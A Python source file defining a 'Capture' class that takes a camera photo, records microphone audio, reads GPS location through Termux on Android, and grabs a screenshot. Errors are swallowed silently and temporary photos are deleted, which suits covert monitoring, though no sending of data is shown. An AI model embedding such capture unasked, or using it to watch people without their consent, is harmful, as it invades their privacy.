import os
import subprocess
import time
import io
import cv2
import numpy as np
import pyaudio
import wave

class Capture:
    @staticmethod
    def camera():
        """Returns image (numpy array) or None."""
        if os.name == 'posix' and os.path.exists('/data/data/com.termux/files/usr/bin/termux-camera-photo'):
            filename = f"/sdcard/cam_{int(time.time())}.jpg"
            try:
                subprocess.run(['termux-camera-photo', '-c', '0', filename], check=True, timeout=10)
                if os.path.exists(filename):
                    img = cv2.imread(filename)
                    os.remove(filename)
                    return img
            except:
                pass
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        return frame if ret else None

    @staticmethod
    def microphone(duration=3):
        """Returns WAV bytes."""
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        p = pyaudio.PyAudio()
        try:
            stream = p.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            wav_io = io.BytesIO()
            wf = wave.open(wav_io, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            wav_io.seek(0)
            return wav_io.read()
        except:
            return None

    @staticmethod
    def location():
        if os.path.exists('/data/data/com.termux/files/usr/bin/termux-location'):
            try:
                return subprocess.check_output(['termux-location'], text=True, timeout=10)
            except:
                pass
        return None

    @staticmethod
    def screenshot():
        try:
            from PIL import ImageGrab
            im = ImageGrab.grab()
            buf = io.BytesIO()
            im.save(buf, format='PNG')
            buf.seek(0)
            return buf.read()
        except:
            return None